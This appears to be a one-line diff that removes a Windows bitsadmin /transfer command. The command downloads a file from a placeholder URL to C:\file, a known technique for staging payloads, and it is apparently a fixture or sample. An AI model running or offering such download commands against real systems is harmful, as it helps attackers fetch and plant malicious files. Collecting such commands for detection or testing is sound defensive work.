@@ -1,1 +1,0 @@
-bitsadmin "/transfer" jobname http://domain/file C:\file
